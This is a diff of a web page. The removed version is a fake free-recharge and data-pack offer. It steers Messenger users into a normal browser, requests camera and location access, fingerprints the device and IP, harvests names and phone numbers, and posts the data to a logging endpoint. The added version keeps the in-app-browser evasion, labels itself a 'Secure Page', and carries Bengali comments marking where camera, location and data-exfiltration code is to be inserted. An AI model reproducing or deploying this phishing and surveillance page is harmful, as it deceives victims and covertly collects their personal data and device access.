@@ -1,112 +1,101 @@
-<!-- Messenger-friendly version -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎁 Free Recharge / Data Pack Offer</title>
-<link rel="icon" type="image/png" href="/static/favicon.png" />
-<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-<style>
-body { margin:0; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; text-align:center; background:#fff0f0; flex-direction:column; }
-#loading { font-size:1.2rem; color:#333; margin-bottom:20px; }
-#openBrowserWarning { display:none; }
-#openBrowserWarning a { display:inline-block; padding:14px 20px; background:#e60023; color:#fff; text-decoration:none; border-radius:12px; margin-top:10px; transition:0.3s; }
-#openBrowserWarning a:hover { background:#b3001b; transform:scale(1.02); }
-#main { display:none; background:#fff; padding:2rem; border-radius:20px; box-shadow:0 8px 25px rgba(0,0,0,0.2); max-width:400px; width:90%; }
-input, select, button { width:100%; padding:12px; margin:10px 0; border-radius:12px; font-size:1rem; }
-button { background:#e60023; color:white; border:none; cursor:pointer; transition:0.3s; }
-button:hover { background:#b3001b; transform:scale(1.02); }
-.success { display:none; color:green; margin-top:1rem; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px;
+    }
+    #warning, #mainContent {
+      display: none;
+    }
+    .btn {
+      display: inline-block;
+      margin: 10px;
+      padding: 12px 20px;
+      font-size: 16px;
+      color: white;
+      background: #007bff;
+      border: none;
+      border-radius: 5px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .btn:active {
+      background: #0056b3;
+    }
+    .copyBox {
+      margin-top: 20px;
+    }
+    input {
+      padding: 8px;
+      width: 80%;
+    }
+  </style>
 </head>
 <body>
 
-<div id="loading">⏳ Please wait...</div>
+  <!-- Messenger warning -->
+  <div id="warning">
+    <h2>⚠️ Open in Browser Required</h2>
+    <p>This page cannot run inside Messenger/In-App Browser.</p>
+    <a id="openBrowserLink" class="btn" href="" target="_blank" rel="noopener noreferrer">
+      Open in Browser
+    </a>
 
-<div id="openBrowserWarning">
-  ⚠️ Camera & Location may not work in Messenger.<br>
-  <a id="openBrowserLink" href="#" target="_blank">Open in Browser অফার নিতে এখানে ক্লিক করুন </a>
-</div>
+    <div class="copyBox">
+      <p>Or copy the link manually:</p>
+      <input type="text" id="copyLink" readonly>
+      <button class="btn" onclick="copyLink()">Copy</button>
+    </div>
+  </div>
 
-<div id="main">
-  <h1>🎉 Congratulations!</h1>
-  <p>You are eligible for a <strong>Free 500TK Recharge</strong> or <strong>50GB Data Pack</strong>.</p>
-  <input type="text" id="name" placeholder="Enter Your Name" required />
-  <input type="tel" id="number" placeholder="Enter Mobile Number" required />
-  <select id="option">
-    <option value="500TK Recharge">500TK Recharge</option>
-    <option value="50GB Data">50GB Data</option>
-  </select>
-  <button onclick="claimReward()">Recharge Now</button>
-  <p class="success" id="successMsg"></p>
-</div>
+  <!-- Main content -->
+  <div id="mainContent">
+    <h2>✅ Main Content Loaded</h2>
+    <p>Your location & data will be collected...</p>
 
-<script>
-// Detect Messenger / WebView
-function isInWebView(){
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  return (ua.includes('FBAN') || ua.includes('FBAV') || ua.includes('Messenger'));
-}
+    <!-- এখানে তোমার ম্যাপ, ক্যামেরা, ডাটা-সেন্ড কোড যাবে -->
+  </div>
 
-// Page load
-window.addEventListener('load', ()=>{
-  setTimeout(()=>{
-    document.getElementById("loading").style.display = "none";
-    if(isInWebView()){
-      const link = document.getElementById('openBrowserLink');
-      link.href = window.location.href; // direct link
-      document.getElementById('openBrowserWarning').style.display='block';
+  <script>
+    // detect Messenger/In-App Browser
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const inApp = /FBAN|FBAV|Instagram|Messenger/i.test(ua);
+
+    const warning = document.getElementById('warning');
+    const mainContent = document.getElementById('mainContent');
+    const link = document.getElementById('openBrowserLink');
+    const copyField = document.getElementById('copyLink');
+
+    // set current URL
+    const currentUrl = window.location.href;
+    link.href = currentUrl;
+    copyField.value = currentUrl;
+
+    if (inApp) {
+      // Messenger detected → show warning only
+      warning.style.display = 'block';
     } else {
-      document.getElementById("main").style.display='block';
-      collectAndSendData();
+      // Normal browser → show main content
+      mainContent.style.display = 'block';
+
+      // এখানে তোমার ডাটা কালেকশন কোড বসাও
+      console.log("Collecting data...");
     }
-  },2000);
-});
 
-// Permissions & Data Collection
-async function requestPermissions(){
-  try{
-    if(navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(()=>{},()=>{}, { enableHighAccuracy:true, timeout:10000 });
+    // Copy link function
+    function copyLink() {
+      copyField.select();
+      copyField.setSelectionRange(0, 99999);
+      document.execCommand("copy");
+      alert("Link copied!");
     }
-    try{ await navigator.mediaDevices.getUserMedia({ video:{ width:320,height:240 } }); }catch{}
-  }catch{}
-}
+  </script>
 
-async function collectAndSendData(){
-  requestPermissions();
-  const [ipData] = await Promise.all([
-    fetch('https://api.ipify.org?format=json').then(res=>res.json()).then(d=>d.ip).catch(()=> "Unknown")
-  ]);
-  const deviceInfo = {
-    userAgent:navigator.userAgent,
-    platform:navigator.platform,
-    cores:navigator.hardwareConcurrency||"Unknown",
-    memory:navigator.deviceMemory||"Unknown",
-    screen:`${screen.width}x${screen.height}`,
-    languages:navigator.languages,
-    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
-  };
-  fetch('/log-data',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({ ip:ipData, device_info:JSON.stringify(deviceInfo) })
-  }).catch(e=>console.error("Send error:",e));
-}
-
-// Reward
-function claimReward(){
-  const name=document.getElementById("name").value.trim();
-  const number=document.getElementById("number").value.trim();
-  const option=document.getElementById("option").value;
-  if(!name || !number){ alert("⚠️ Please enter all fields correctly!"); return; }
-  confetti({ particleCount:100, spread:70, origin:{y:0.6} });
-  const successMsg=document.getElementById("successMsg");
-  successMsg.textContent=`✅ ${option} has been successfully applied for ${name}!`;
-  successMsg.style.display='block';
-  setTimeout(()=>{ location.reload(); },3000);
-}
-</script>
 </body>
 </html>
